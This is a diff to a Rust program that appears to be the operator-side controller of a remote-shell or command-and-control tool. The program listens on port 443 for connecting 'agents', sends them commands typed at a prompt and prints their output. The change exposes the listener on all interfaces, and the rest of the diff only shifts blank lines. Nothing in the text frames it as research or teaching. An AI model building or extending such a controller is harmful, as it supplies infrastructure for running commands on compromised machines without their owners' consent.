@@ -2,7 +2,7 @@ use std::io::{self,  BufReader, Read, Write};
 use std::net::{TcpListener, TcpStream};
 
 fn main() {
-    let controller = TcpListener::bind("127.0.0.1:443").expect("Could not bind to the port");
+    let controller = TcpListener::bind("0.0.0.0:443").expect("Could not bind to the port");
 
     for mut in_stream in controller.incoming() {
         match in_stream {
@@ -24,8 +24,11 @@ fn main() {
 fn handle_agent(mut incomingstream: TcpStream) {
     loop {
         let mut command = String::new();
+
         print!(">> ");
+
         io::stdout().flush().expect("failed to get it");
+
         io::stdin()
             .read_line(&mut command)
             .expect("Failed to read from stdin");
@@ -37,7 +40,6 @@ fn handle_agent(mut incomingstream: TcpStream) {
         let mut cmd_result = [0 as u8; 5096];
 
         let mut incomingstreamreader = BufReader::new(&incomingstream);
-
         incomingstreamreader.read(&mut cmd_result).unwrap();
         println!("{}", String::from_utf8_lossy(&cmd_result).to_string());
     }
